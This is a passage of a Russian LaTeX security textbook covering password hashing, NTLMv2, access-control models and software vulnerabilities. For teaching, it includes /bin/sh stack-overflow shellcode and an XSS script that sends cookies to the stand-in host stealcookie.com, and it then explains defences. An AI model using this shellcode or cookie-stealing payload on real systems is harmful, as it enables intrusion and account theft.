Соль применяется для избежания словарных атак. \textbf{Словарная} атака заключается в том, что злоумышленник один раз заранее вычисляет таблицы хэшей от наиболее \emph{вероятных} сообщений, т.е. составляет словарь пароль-хэш, и далее производит поиск по вычисленной таблице для взламывания исходного сообщения. Словарные атаки использовались ранее для взлома паролей $m$, которые хранились в виде обычных хэшей $h(m)$. Усовершенствованной словарной атакой является метод радужных таблиц, позволяющий практически взламывать хэши длиной до 64--128 бит. Использование соли делает невозможной словарную атаку, так как значение функции вычисляется уже не от оригинального пароля, а от конкатенации <<соли>> и пароля.

<<Соль>> может храниться как отдельное значение, единственное и уникальное для системы целиком, так и быть уникальной для каждого сохранённого пароля и храниться со значением функции хэширования:
\begin{itemize}
	\item $s ~\|~ h(s ~\|~ m)$
	\item $s ~\|~ h(m ~\|~ s)$
	\item $s_1 ~\|~ h(m ~\|~ s_1 ~\|~ s_2)$
\end{itemize}

В первом случае функция хэширования вычисляется от конкатенации <<соли>> и пароля пользователя. Во втором случае в строке сначала идёт пароль, а потом -- <<соль>>. Это позволяет немного усложнить задачу злоумышленнику при переборе паролей (он не сможет сократить время вычисления значения функции хэширования за счёт одинакового префикса у всех аргументов функции хэширования). В третьем случае используется сразу две соли -- одна хранится вместе с паролем, а вторая выступает внешним параметром, хранящимся отдельно от базы данных паролей.

В рассмотренной ранее модели построения паролей в виде слогов с элементами небольшой модификации мы получили количество паролей около $2^{70}$ для 12-символьных паролей. Данный объем вычислений уже почти достижим. Следовательно, даже соль не защищает пароли от взлома, если у злоумышленника есть доступ к файлу с паролями или возможность неограниченных попыток аутентификации. Поэтому файлы с паролями дополнительно защищаются, а в системы аутентификации по паролю вводят ограничения на попытки неуспешной аутентификации.

\subsection[Unix]{Хранение паролей в Unix}

В ОС Unix пароль $m$ пользователя хранится в файле \texttt{/etc/shadow} в виде хэша (SHA, MD5 и~т.д.) или результата шифрования (DES, Blowfish и~т.д.), вычисленного с солью $s$ длиной от 2 (для функции crypt в оригинальной ОС UNIX) до 16 (для Blowfish в OpenBSD) ASCII-символов. То, как используется соль, зависит от используемого алгоритма. Например, в традиционном алгоритме, используемом в оригинальном UNIX, соль модифицирует S-блоки и P-блоки в протоколе DES.

Файл \texttt{/etc/shadow} доступен только привилегированным процессам, что вносит дополнительную защиту.


\subsection[Windows]{Хранение паролей и аутентификация в \protect\\ Windows}

%[MS-NLMP]: NT LAN Manager (NTLM) Authentication Protocol Specification -- 09/25/2009, Rev. 11.0
%http://blogs.technet.com/authentication/archive/2006/04/07/ntlm-s-time-has-passed.aspx
%http://technet.microsoft.com/en-us/library/cc755284(WS.10).aspx -- Windows Authentication, Updated: February 7, 2008
%http://207.46.16.252/en-us/magazine/2006.08.securitywatch.aspx - The Most Misunderstood Windows Security Setting of All Time, Jesper Johansson
%http://en.wikipedia.org/wiki/NTLM
%http://www.windowsnetworking.com/nt/atips/atips92.shtml

ОС Windows, начиная с Vista, Server 2008, Windows 7, сохраняет пароли в виде NT-хэша, который вычисляется как 128-битовый хэш MD4 от пароля в Unicode кодировке. NT-хэш не использует соль, поэтому применима словарная атака. На словарной атаке основаны программы поиска (взлома) паролей для Windows. Файл паролей называется SAM (Security Account Manager) в случае локальной аутентификации. Если пароли хранятся на сетевом сервере, то они хранятся в специальном файле, доступ к которому ограничен.

В последнем протоколе аутентификации NTLMv2\footnote{[MS-NLMP]: NT LAN Manager (NTLM) Authentication Protocol Specification, Rev. 11.}\index{NTLM, NTLMv2} пользователь для входа в свой компьютер аутентифицируется либо локально на компьютере, либо удаленным сервером, если учетная запись пользователя хранится на сервере. Пользователь с именем $user$ вводит пароль в программу-\emph{клиент}, которая, взаимодействуя с программой-\emph{сервером} (локальной или удаленной на сервере домена $domain$), аутентифицирует пользователя для входа в систему.
\begin{enumerate}
    \item Клиент $\rightarrow$ Сервер: запрос аутентификации.
    \item Клиент $\leftarrow$ Сервер: 64-битовая псевдослучайная одноразовая метка $n_s$.
    \item Вводимый пользователем пароль хэшируется в $\textrm{NThash}$ без соли. Клиент генерирует 64-битовую псевдослучайную одноразовую метку $n_c$, создает метку времени $ts$. Далее вычисляются 128-битовые имитовставки\index{имитовставка} $\HMAC$ на хэш-функции MD5 с ключами $\textrm{NT-hash}$ и $\textrm{NTOWF}$:
        \[ \textrm{NThash} = \text{MD4}(\text{Unicode}(\text{пароль})), \]
        \[ \textrm{NTOWF} = \textrm{HMAC-MD5}_{\textrm{NThash}}(user, domain), \]
        %\[ \text{LMv2-response} = \text{HMAC-MD5}_{\text{NTLMv2-hash}}(n_c, n_s), \]
        \[ \textrm{NTLMv2-response} = \textrm{HMAC-MD5}_{\textrm{NTOWF}}(n_c, n_s, ts, domain). \]
    \item Клиент $\rightarrow$ Сервер: $(n_c, \textrm{NTLMv2-response})$. %LMv2-response,
    \item Сервер для указанных имен пользователя и домена извлекает из базы паролей требуемый NT-hash, производит аналогичные вычисления и сравнивает значения имитовставок. Если они совпадают, аутентификация успешна.
\end{enumerate}

В случае аутентификации на локальном компьютере сравниваются значения $\textrm{NTOWF}$, вычисленное от пароля пользователя и извлеченное из файла паролей SAM.

Как видно, протокол аутентификации NTLMv2 обеспечивает одностороннюю аутентификацию пользователя серверу (или своему ПК).

При удаленной аутентификации по сети последние версии Windows используют протокол Kerberos, который обеспечивает взаимную аутентификацию, и только если аутентификация по Kerberos не поддерживается клиентом или сервером, она происходит по NTLMv2.


\section{Аутентификация в веб-сервисах}
\selectlanguage{russian}

Протокол HTTP\index{протокол!HTTP} (вместе с HTTPS\index{протокол!HTTPS}) является, в настоящий момент, наиболее популярным протоколом, использующимся в сети Интернет для доступа к сервисам, таким как социальные сети или веб-клиенты электронной почты. Данный протокол является протоколом запрос-ответ\index{протокол!запрос-ответ}, причём для каждого запроса открывается новое соединение с сервером\footnote{Для версии протокола HTTP/1.0 существует неофициальное~\cite[p.~17]{Totty:2002} расширение в виде заголовка \texttt{Connection: Keep-Alive}, который позволяет использовать одно соединение для нескольких запросов. Версия протокола HTTP/1.1 по умолчанию~\cite[6.3.~Persistence]{rfc7230} устанавливает поддержку выполнения нескольких запросов в рамках одного соединения. Однако все запросы всё равно выполняются независимо друг от друга.}. То есть протокол HTTP не является сессионным протоколом\index{протокол!сессионный}. В связи с этим задачу аутентификации на веб-сервисах можно различить на задачи первичной и вторичной аутентификации. \textit{Первичной аутентификацией}\index{аутентификация!первичная} будем называть механизм обычной аутентификации пользователя в рамках некоторого HTTP-запроса, а \textit{вторичной}\index{аутентификация!вторичная} (или \textit{повторной}\index{аутентификация!повторная}) -- некоторый механизм подтверждения в рамках последующих HTTP-запросов, что пользователь уже был \textit{ранее} аутентифицирован веб-сервисом в рамках первичной аутентификации.

Аутентификация в веб-сервисах также бывает \textit{односторонней}\index{аутентификация!односторонняя} (как со стороны клиента, так и со стороны сервиса) и \textit{взаимной}\index{аутентификация!взаимная}. Под аутентификацией веб-сервиса обычно понимается возможность сервиса доказать клиенту, что он является именно тем веб-сервисом, к которому хочет получить доступ пользователь, а не его мошеннической подменой, созданной злоумышленниками. Для аутентификации веб-сервисов используется механизм сертификатов открытых ключей\index{сертификат открытого ключа} протокола HTTPS\index{протокол!HTTPS} с использованием инфраструктуры открытых ключей\index{инфраструктура открытых ключей} (см. раздел~\ref{chapter-public-key-infrastructure}).

При использовании протокола HTTPS\index{протокол!HTTPS} и наличии соответствующей поддержки со стороны веб-сервиса клиент также имеет возможность аутентифицировать себя с помощью своего сертификата открытого ключа\index{сертификат открытого ключа}. Данный механизм редко используется в публичных веб-сервисах, так как требует от клиента иметь на устройстве, с которого осуществляется доступ, файл сертификата открытого ключа.

\subsection{Первичная аутентификация по паролю}

Стандартная первичная аутентификация в современных веб-сервисах происходит обычной передачей логина и пароля в открытом виде по сети. Если SSL-соединение не используется, логин и пароль могут быть перехвачены. Даже при использовании SSL-соединения веб-приложение имеет доступ к паролю в открытом виде.

Более защищенным, но мало используемым способом аутентификации является вычисление хэша от пароля $m$, соли $s$ и псевдослучайных одноразовых меток $n_1, n_2$ с помощью JavaScript в браузере и отсылка по сети только результата вычисления хэша.
\[ \begin{array}{ll}
    \text{Браузер} ~\rightarrow~ \text{Сервис:} & \text{HTTP GET-запрос} \\
    \text{Браузер} ~\leftarrow~ \text{Сервис:}  & s ~\|~ n_1 \\
    \text{Браузер} ~\rightarrow~ \text{Сервис:} & n_2 ~\|~ h( h(s ~\|~ m) ~\|~ n_1 ~\|~ n_2) \\
\end{array} \]

Если веб-приложение хранит хэш от пароля и соли $h(s ~\|~ m)$, то пароль не может быть перехвачен ни по сети, ни веб-приложением.

В массовых интернет-сервисах пароли часто хранятся в открытом виде на сервере, что не является хорошей практикой для обеспечения защиты персональных данных пользователей.

\input{openid}

\input{cookies_auth}


\chapter{Программные уязвимости}

\section[Контроль доступа в информационных системах]{Контроль доступа в \protect\\ информационных системах}
\selectlanguage{russian}

%http://www.acsac.org/2005/papers/Bell.pdf
%http://www.dranger.com/iwsec06_co.pdf
%http://csrc.nist.gov/groups/SNS/rbac/documents/design_implementation/Intro_role_based_access.htm
%http://en.wikipedia.org/wiki/Access_control#Computer_security
%http://en.wikipedia.org/wiki/Discretionary_access_control
%http://en.wikipedia.org/wiki/Mandatory_access_control
%http://en.wikipedia.org/wiki/Role-Based_Access_Control

В информационных системах контроль доступа вводится на \emph{действия} \emph{субъектов} над \emph{объектами}. В операционных системах под субъектами почти всегда понимаются процессы, под объектами -- процессы, разделяемая память, объекты файловой системы, порты ввода-вывода и т.д., под действием -- чтение (файла или содержимого директории), запись (создание, добавление, изменение, удаление, переименование файла или директории) и исполнение (файла-программы). Система контроля доступа в информационной системе (операционной системе, базе данных и т.д.) определяет множество субъектов, объектов и действий.

Применение контроля доступа создается 1) \emph{аутентификацией} субъектов и объектов, 2) \emph{авторизацией} допустимости действия, 3) \emph{аудитом} (проверкой и хранением) ранее совершенных действий.

Различают три основные модели контроля доступа -- дискреционная\index{управление доступом!дискреционное} (discretionary access control\index{access control!discretionary}, DAC\index{DAC}), мандатная\index{управление доступом!мандатное} (mandatory access control\index{access control!mandatory}, MAC\index{MAC}) и ролевая\index{управление доступом!ролевое} (role-based access control\index{access control!role-based}, RBAC\index{RBAC}) модели. Современные операционные системы используют \emph{комбинации} двух или трех моделей доступа, причем решения о доступе принимаются в порядке убывания приоритета: ролевая, мандатная, дискреционная модели.

Использование систем контроля доступа и защиты информации в операционных системах используется не только для защиты от злоумышленника, но и для повышения устойчивости системы в целом. Однако появление новых механизмов в новых версиях ОС может привести к проблемам совместимости с уже существующим программным обеспечением.

\subsection{Дискреционная модель}

Классическое определение дискреционной модели\index{контроль доступа!дискреционный} из так называемой Оранжевой книги 1985 г. (Trusted Computer System Evaluation Criteria, устаревший стандарт министерства обороны США 5200.28-STD) следующее -- средства ограничения доступа к объектам, основанные на сущности (identity) субъекта и/или группы, к которой они принадлежат. Субъект, имеющий определенный доступ к объекту, имеет возможность полностью или частично передать право доступа другому субъекту.

На практике дискреционная модель доступа предполагает, что для каждого объекта в системе определен субъект-владелец. Этот субъект может самостоятельно устанавливать необходимые, по его мнению, права доступа к любому из своих объектов для остальных субъектов, в том числе и для себя самого. Логически владелец объекта является владельцем информации, находящейся в этом объекте. При доступе некоторого субъекта к какому-либо объекту система контроля доступа лишь считывает установленные для объекта права доступа и сравнивает их с правами доступа субъекта. Кроме того, предполагается наличие в ОС некоторого выделенного субъекта -- администратора дискреционного управления доступом, который имеет привилегию устанавливать дискреционные права доступа для любых, даже ему не принадлежащих, объектов в системе.

Дискреционную модель реализуют почти все популярные ОС, в частности, Windows и Unix. У каждого субъекта (процесса пользователя или системы) и объекта (файла, другого процесса и т.д.) есть владелец, который может делегировать доступ другим субъектам, изменяя атрибуты на чтение, запись файлов для других пользователей и групп пользователей. Администратор системы имеет возможность назначить нового владельца и другие права доступа к объектам.


\subsection{Мандатная модель}

Классическое определение мандатной модели\index{контроль доступа!мандатный} из Оранжевой книги -- средства ограничения доступа к объектам, основанные на важности (секретности) информации, содержащейся в объектах, и обязательная авторизация действий субъектов для доступа к информации с присвоенным уровнем важности. Важность информации определяется уровнем доступа, приписываемым всем объектам и субъектам. Исторически мандатная модель определяла важность информации в виде иерархии, например, совершенно секретно (СС), секретно (С), конфиденциально (К) и рассекречено (Р). При этом верно следующее: СС $>$ C $>$ K $>$ P, то есть каждый уровень включает сам себя и все уровни, находящиеся ниже в иерархии.

Современное определение мандатной модели -- применение явно указанных правил доступа субъектов к объектам, определяемых только администратором системы. Сами субъекты (пользователи) не имеют возможности для изменения прав доступа. Правила доступа описаны матрицей, в которой столбцы соответствуют субъектам, строки -- объектам, а в ячейках -- допустимые действия субъекта над объектом. Матрица покрывает все пространство субъектов и объектов. Также определены правила наследования доступа для новых создаваемых объектов. В мандатной модели матрица может быть изменена только администратором системы.

Модель Белл-Ла Падулы (Bell-La Padula) использует два мандатных и одно дискреционное правила политики безопасности:
\begin{enumerate}
    \item Субъект с определенным уровнем секретности не может иметь доступ на \emph{чтение} объектов с более \emph{высоким} уровнем секретности (no read-up).
    \item Субъект с определенным уровнем секретности не может иметь доступ на \emph{запись} объектов с более \emph{низким} уровнем секретности (no write-down).
    \item Использование матрицы доступа субъектов к объектам для описания дискреционного доступа.
\end{enumerate}


\subsection{Ролевая модель}

Ролевая модель доступа основана на определении ролей в системе\index{контроль доступа!ролевой}. Понятие <<роль>> в этой модели -- это совокупность действий и обязанностей, связанных с определенным видом деятельности. Таким образом, достаточно указать тип доступа к объектам для определенной роли и определить группу субъектов, для которых она действует.
Одна и та же роль может использоваться несколькими различными субъектами (пользователями). В некоторых системах пользователю разрешается выполнять несколько ролей одновременно, в других есть ограничение на одну или несколько не противоречащих друг другу ролей в каждый момент времени.

Ролевая модель, в отличие от дискреционной и мандатной, позволяет реализовать разграничение полномочий пользователей, в частности, на системного администратора и офицера безопасности, что повышает защиту от человеческого фактора.


\input{os_access_controls}

\section{Виды программных уязвимостей}

В 1949 г. фон Нейман ввел понятие самовоспроизводящихся механических машин.
%Самовоспроизводящейся программой называется программа, создающая и распространяющая свои копии.

\textbf{Вирусом} называется самовоспроизводящаяся часть кода (подпрограмма)\index{вирус}, которая встраивается в носители (другие программы) для своего исполнения и распространения. Вирус не может исполняться и передаваться без своего носителя.

\textbf{Червем} называется самовоспроизводящаяся отдельная (под)программа\index{червь}, которая может исполняться и распространяться самостоятельно, не используя программу-носитель.

Первым сетевым вирусом считается вирус Creeper 1971 г., распространявшийся в сети ARPANET, предшественнике Интернета. Для его уничтожения был создан первый антивирус, Reaper, который находил и уничтожал Creeper.

Первый червь для Интернета, червь Морриса 1988 г., уже использовал \emph{смешанные} атаки для заражения UNIX машин~\cite{EichinRochlis:1988}\cite{Spafford:1989}. Сначала программа получала доступ к удалённому запуску команд, эксплуатируя уязвимости в сервисах \texttt{sendmail}, \texttt{finger} (с использованием атаки переполнением буфера) или \texttt{rsh}. Далее с помощью механизма подбора паролей червь получал доступ к локальным аккаунтам пользователей:
\begin{itemize}
    \item получение доступа к учётным записям с очевидными паролями:
		\begin{itemize}
			\item без пароля вообще;
			\item имя аккаунта в качестве пароля;
			\item имя аккаунта в качестве пароля, повторенное дважды;
			\item использование <<ника>> (англ. <<nickname>>);
			\item фамилия (англ. <<lastname>>);
			\item фамилия, записанная задом наперёд;
		\end{itemize}
		\item перебор паролей на основе встроенного словаря из 432 слов;
		\item перебор паролей на основе системного словаря \texttt{/usr/dict/words}.
\end{itemize}

\textbf{Программной уязвимостью}\index{программная уязвимость} называется свойство программы, позволяющее нарушить ее работу. Программные уязвимости могут приводить к отказу в обслуживании\index{отказ в обслуживании} (Denial of Service\index{Denial of Service}, DoS\index{DoS}), утечке и изменению данных, появлению и распространению вирусов и червей.

Одной из распространенных атак для заражения персональных компьютеров является переполнение буфера в стеке. В интернет-сервисах наиболее распространенной программной уязвимостью в настоящее время является межсайтовый скриптинг (Cross-Site Scripting\index{Cross-Site Scripting}, XSS\index{XSS}).

Наиболее распространенные программные уязвимости можно разделить на классы:
\begin{enumerate}
    \item Переполнение буфера -- копирование в буфер данных большего размера, чем длина выделенного буфера. Буфером может быть контейнер текстовой строки, массив, динамически выделяемая память и т.д. Переполнение становится возможным вследствие либо отсутствия контроля над длиной копируемых данных, либо из-за ошибок в коде. Типичная ошибка -- разница в 1 байт между размерами буфера и данных при сравнении.
    \item Некорректная обработка (парсинг) данных, введенных пользователем, является причиной большинства программных уязвимостей в веб-приложениях. Под обработкой понимаются:
        \begin{enumerate}
            \item проверка на допустимые значения и тип (числовые поля не должны содержать строки и т.д.);
            \item фильтрация и экранирование специальных символов, имеющих значения в скриптовых языках или для декодирования из одной текстовой кодировки в другую. Примеры символов: \texttt{\textbackslash},  \texttt{\%}, \texttt{<}, \texttt{>}, \texttt{"},  \texttt{'};
            \item фильтрация ключевых слов языков разметки и скриптов. Примеры: \texttt{script}, \texttt{JavaScript};
            \item декодирование различными кодировками при парсинге. Распространенный способ обхода системы контроля парсинга данных состоит в однократном или множественном последовательном кодировании текстовых данных в шестнадцатеричные кодировки \texttt{\%NN} ASCII и UTF-8. Например, браузер или веб-приложения производят $n$ -- кратные последовательные декодирования, в то время как система контроля делает $k$-кратное декодирование, $0 \leq k < n$, и, следовательно, пропускает закодированные запрещенные символы и слова.
        \end{enumerate}
    \item Некорректное использование синтаксиса функций. Например, \texttt{printf(s)} может привести к уязвимости записи в указанный адрес памяти. Если злоумышленник вместо обычной текстовой строки введет в качестве \texttt{s = "текст некоторой длины\%n"}, то функция \texttt{printf()}, ожидающая первым аргументом строку формата \texttt{printf(fmt, \dots)}, обнаружив \texttt{\%n}, возьмет значения из ячеек памяти, следующих перед текстовой строкой (устройство стека функции описано далее), и запишет в адрес памяти, равный считанному значению, количество выведенных символов на печать функцией \texttt{printf()}.
\end{enumerate}


\section[Переполнение буфера в стеке с исполнением кода]{Переполнение буфера в стеке с \protect\\ исполнением кода}
\selectlanguage{russian}

В качестве примера переполнения буфера опишем самую распространенную атаку, направленную на исполнение кода злоумышленника.

В 64-битовой x86\_64 архитектуре основное пространство виртуальной памяти процесса из 16 эксабайтов ($2^{64}$ байтов) свободно и только малая часть занята (выделена). Виртуальная память выделяется процессу операционной системой блоками по 4 Кб, называемыми страницами памяти. Выделенные страницы соответствуют страницам физической оперативной памяти или страницам файлов.

Пример выделенной виртуальной памяти процесса представлен в табл. \ref{tab:virtual-memory}. Локальные переменные функций хранятся в области памяти, называемой стеком.
\begin{table}[!ht]
    \centering
    \caption{Пример структуры виртуальной памяти процесса\label{tab:virtual-memory}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{r|c|}
        \multicolumn{2}{c}{Адрес ~~~~~~~~~~~~~~ Использование} \\
        \cline{2-2}
        \texttt{0x00000000 00000000} & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00000000 0040063F} & \multirow{2}{*}{\parbox{6cm}{Исполняемый код, динамические библиотеки}} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00000000 0143E010} & \multirow{2}{*}{Динамическая память} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00007FFF A425DF26} & \multirow{2}{*}{Переменные среды} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00007FFF FFFFEB60} & \multirow{2}{*}{Стек функций} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        \texttt{0xFFFFFFFF FFFFFFFF} & \\
        \cline{2-2}
    \end{tabular} }
\end{table}

Приведем пример переполнения буфера в стеке\index{стек}, которое дает возможность исполнить код, для 64-разрядной ОС Linux. Ниже приводится листинг исходной программы, которая печатает расстояние Хэмминга между векторами $b1 = \text{\texttt{0x01234567}}$ и $b2 = \text{\texttt{0x89ABCDEF}}$.

\begin{verbatim}
#include <stdio.h>
#include <string.h>

int hamming_distance(unsigned a1, unsigned a2, char *text,
                     size_t textsize) {
  char buf[32];
  unsigned distance = 0;
  unsigned diff = a1 ^ a2;
  while (diff) {
    if (diff & 1) distance++;
    diff >>= 1;
  }
  memcpy(buf, text, textsize);
  printf("%s: %i\n", buf, distance);
  return distance;
}

int main() {
  char text[68] = "Hamming";
  unsigned b1 = 0x01234567;
  unsigned b2 = 0x89ABCDEF;
  return hamming_distance(b1, b2, text, 8);
}
\end{verbatim}

Вывод программы при запуске:
\begin{verbatim}
$ ./hamming
Hamming: 8
\end{verbatim}

При вызове вложенных функций вызывающая функция выделяет стековый кадр для вызываемой функции в сторону уменьшения адресов. Стековый кадр в порядке уменьшения адресов состоит из следующих частей:
\begin{enumerate}
    \item Аргументы вызова функции, расположенные в порядке уменьшения адреса (за исключением тех, которые передаются в регистрах процессора).
    \item Сохраненный регистр процессора \texttt{rip} внешней функции, также называемый адресом возврата. Регистр процессора \texttt{rip} содержит адрес следующей инструкции для исполнения. При входе во вложенную функцию адрес инструкции текущей функции запоминается в стеке, в регистре записывается новое значение адреса первой инструкции из вложенной функции, а по завершении функции регистр восстанавливается из стека, и, таким образом, исполнение возвращается назад.
    \item Сохраненный регистр процессора \texttt{rbp} внешней функции. Регистр процессора \texttt{rbp} содержит адрес сохраненного регистра \texttt{rbp} в стековом кадре вызывающей функции. Процессор обращается к локальным переменным функций по смещению относительно регистра \texttt{rbp}. При вызове вложенной функции регистр сохраняется в стеке, в регистр записывается текущее значение адреса стека (\texttt{rsp}), а по завершении функции регистр восстанавливается.
    \item Локальные переменные, как правило расположенные в порядке уменьшения адреса при объявлении новой переменной (порядок может быть изменен в результате оптимизаций и использования механизмов защиты, таких как Stack Smashing Protection в компиляторе GCC).
\end{enumerate}

Адрес начала стека, а также, возможно, адреса локальных массивов и переменных выровнены на границу параграфа в 16 байтов, из-за чего в стеке могут образоваться неиспользуемые байты.

Если в программе есть ошибка, которая может привести к переполнению выделенного буфера в стеке при копировании, есть возможность записать вместо сохраненного значения регистра -- \texttt{rip} новое. В результате по завершении данной функции исполнение начнется с указанного адреса. Если есть возможность записать в переполняемый буфер исполняемый код, а затем на место сохраненного регистра \texttt{rip} адрес на этот код, то получим исполнение заданного кода в стеке функции.

На рис. \ref{fig:stack-overflow} приведены исходный стек и стек с переполненным буфером, из-за которого записалось новое сохраненное значение \texttt{rip}.

\begin{figure}[!ht]
	\centering
	\includegraphics[width=0.95\textwidth]{pic/stack-overflow}
	\caption{Исходный стек и стек с переполнением буфера\label{fig:stack-overflow}}
\end{figure}


Изменим программу для демонстрации, поместив в копируемую строку исполняемый код для вызова \texttt{/bin/sh}.
{ \small
\begin{verbatim}
...
int main() {
  char text[68] =
    // 28 байтов исполняемого кода
    "\x90" "\x90" "\x90"                // nop; nop; nop
    "\x48\x31" "\xD2"                   // xor %rdx, %rdx
    "\x48\x31" "\xF6"                   // xor %rsi, %rsi
    "\x48\xBF" "\xDC\xEA\xFF\xFF"
    "\xFF\x7F\x00\x00"                  // mov $0x7fffffffeadc,
                                        //   %rdi
    "\x48\xC7\xC0" "\x3B\x00\x00\x00"   // mov $0x3b, %rax
    "\x0F\x05"                          // syscall
    // 8 байтов строки /bin/sh
    "\x2F\x62\x69\x6E\x2F\x73\x68\x00"  // "/bin/sh\0"
    // 12 байтов заполнения и 16 байтов новых
    // значений сохраненных регистров
    "\x00\x00\x00\x00"                  // не занятые байты
    "\x00\x00\x00\x00"                  // unsigned distance
    "\x00\x00\x00\x00"                  // unsigned diff
    "\x50\xEB\xFF\xFF"                  // регистр
    "\xFF\x7F\x00\x00"                  //   rbp=0x7fffffffeb50
    "\xC0\xEA\xFF\xFF"                  // регистр
    "\xFF\x7F\x00\x00"                  //   rip=0x7fffffffeac0
    ;
  ...
  return hamming_distance(b1, b2, text, 68);
  ...
}
\end{verbatim} }

Код эквивалентен вызову функции \texttt{execve(``/bin/sh'', 0 0)} через системный вызов функции ядра Linux для запуска оболочки среды \texttt{/bin/sh}. При системном вызове нужно записать в регистр \texttt{rax} номер системной функции, а в другие регистры процессора - аргументы. Данный системный вызов с номером \texttt{0x3b} требует в качестве аргументов регистры \texttt{rdi} с адресом строки исполняемой программы, \texttt{rsi} и \texttt{rdx} с адресами строк параметров запускаемой программы и переменных среды. В примере в \texttt{rdi} записывается адрес \texttt{0x7fffffffeadc}, который указывает на строку \texttt{``/bin/sh''} в стеке после копирования. Регистры \texttt{rdx} и \texttt{rsi} обнуляются.

На рис. \ref{fig:stack-overflow} приведен стек с переполненным буфером, в результате которого записалось новое сохраненное значение \texttt{rip}, указывающее на заданный код в стеке.

Начальные инструкции \texttt{nop} с кодом \texttt{0x90} означают пустые операции. Часто точные значения адреса и структуры стека не известны, поэтому злоумышленник угадывает предполагаемый адрес стека. В начале исполняемого кода создается массив из операций \texttt{nop} с надеждой, что предполагаемое значение стека, то есть требуемый адрес rip, попадет на эти операции, повысив шансы угадывания. Стандартная атака на переполнение буфера с исполнением кода также подразумевает последовательный перебор предполагаемых адресов для нахождения правильного адреса для \texttt{rip}.

В результате переполнения буфера в примере по завершении функции \texttt{hamming\_distance()} начнет исполняться инструкция с адреса строки \texttt{buf}, то есть заданный код.


\subsection{Защита}

Самый лучший способ защиты от атак переполнения буфера -- создание программного кода со слежением за размером данных и длиной буфера. Однако ошибки все равно происходят.

Существует три стандартных способа защиты от исполнения кода в стеке в архитектуре x86.

\begin{enumerate}
    \item Все 64-разрядные x86 процессоры включают поддержку NX-бита (non-execution)\index{NX-бит}. В таблице виртуальной памяти, выделенной процессу, каждая страница маркирована битом, называемым NX-битом и указывающим на то, может ли данная страница памяти содержать исполняемый код или нет. Преобразование адресов из виртуальных в адреса физической памяти выполняется процессором на основании таблицы виртуальной памяти процесса. Процессор, считывая в том числе значение NX-бита, запрещает исполнение кода из страниц данных и вызывает критическую ошибку сегментирования (segmentation fault).

        Последние версии ядер ОС поддерживают маркирование страниц выделяемой памяти. Маркирование производится исходя из того содержит страница памяти исполняемый код программы или нет. Приведенный выше пример исполнения кода в стеке не будет работать в 64-битовой ОС Linux последних версий при стандартных настройках.
        %Тем не менее, есть программы, динамически формирующие код во время выполнения для которых NX-бит не используется

    \item Второй стандартный способ -- вставка проверочных символов (называемых canaries, guards) после массивов и в конце стека и их проверка перед выходом из функции. Если произошло переполнение буфера, программа аварийно завершится.

    \item Третий способ -- рандомизация адресного пространства (Address Space Layout Randomization, ASLR), то есть случайное расположение стека, кода и т.д. В настоящее время используется в большинстве современных операционных систем (OpenBSD, Linux, Windows). Это приводит к маловероятному угадыванию адресов и значительно усложняет использование уязвимости.
\end{enumerate}


\subsection{Другие атаки с переполнением буфера}

Почти любую возможность для переполнения буфера в стеке или динамической памяти можно использовать для получения критической ошибки в программе из-за обращения к адресам виртуальной памяти, страницы которых не были выделены процессу. Следовательно, можно проводить атаки отказа в обслуживании (Denial of Service (DoS) атаки).

Переполнение буфера в динамической памяти в случае хранения в ней адресов для вызова функций может привести к подмене адресов и исполнению другого кода.

В описанных DoS-атаках NX-бит не защищает систему.


\section[XSS-атака с исполнением кода браузером]{Межсайтовый скриптинг с \protect\\ исполнением JavaScript кода \protect\\ браузером}
\selectlanguage{russian}

Другой вид распространенных программных уязвимостей состоит в некорректной обработке данных, введенных пользователем. Типичные примеры -- отсутствующее или неправильное экранирование специальных символов и полей (например, спецсимволы \texttt{<} и \texttt{>} HTML, кавычки, слэши \texttt{/}, \texttt{\textbackslash}) и отсутствующая или неправильная проверка введенных данных на допустимые значения (например, SQL-запрос к базе данных веб-ресурса вместо логина пользователя).

Межсайтовый скриптинг (Cross-Site Scripting\index{Cross-Site Scripting}, XSS\index{XSS}) заключается во внедрении в веб-страницу исполняемого текстового скрипта злоумышленником $A$, который будет исполнен браузером клиента $B$. Скрипт может быть на языках JavaScript, VBScript, ActiveX, HTML, Flash. Целью атаки является, как правило, доступ к информации клиента.

Скрипт может получить доступ к cookie-файлам данного сайта, например, с аутентификатором, вставить гиперссылки на свой сайт под видом доверенных ссылок. Вставленные гиперссылки могут содержать информацию пользователя.

Скрипт также может выполнить последовательность HTTP GET- и POST-запросов на веб-сайт для выполнения действий от имени пользователя. Например, вирусно распространить вредоносный JavaScript код со страницы одного пользователя на страницы всех друзей, друзей друзей и т.д. и затем удалить все данные пользователя. Атака может привести к уничтожению социальной сети.

Приведем пример кражи cookie-файла веб-сайта, который имеет уязвимость на вставку текста, содержащего код, который будет исполнен браузером.

%Когда браузер первый раз обращается к сайту, вебприложение может выслать вместе с HTML страницей cookie-файл, хранящий текстовую строку последовательностей

Например, пусть аутентификатор пользователя в cookie-файле сайта \texttt{myemail.com} содержит
\begin{center} \begin{verbatim}
auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

Пусть текстовое сообщение, помещенное пользователем, содержит текстовый скрипт, помещающий на странице <<изображение>>, расположенное по некоему адресу.
\begin{verbatim}
<script>
  new Image().src = "http://stealcookie.com?c=" +
    encodeURI(document.cookie);
</script>
\end{verbatim}

Тогда браузер всех пользователей, которым показывается сообщение, при загрузке страницы отправит HTTP GET-запрос на получение файла <<изображения>> по адресу
\begin{center} \begin{verbatim}
http://stealcookie.com?auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

В результате злоумышленник получит cookie, используя который он может заходить на веб-сайт под видом пользователя.

Вставка гиперссылок является наиболее частой XSS-атакой. Иногда ссылки кодируются шестнадцатеричными числами вида \texttt{\%NN}, чтобы не вызывать сомнения у пользователя текстом ссылки.
%Браузер самостоятельно не может отослать данные на другой сайт, отличный от текущего, поэтому передаваемая информация содержится в гиперссылках.

